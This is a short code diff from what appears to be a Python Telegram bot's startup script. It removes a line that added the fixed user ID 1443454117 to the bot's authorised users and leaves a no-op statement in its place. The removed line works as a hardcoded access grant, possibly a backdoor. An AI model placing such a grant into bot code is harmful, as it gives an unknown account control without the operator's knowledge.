@@ -27,5 +27,5 @@ if __name__ == "__main__" :
         api_hash=Config.API_HASH,
         plugins=plugins
     )
-    Config.AUTH_USERS.add(1443454117)
+    Config.AUTH_USERS
     app.run()
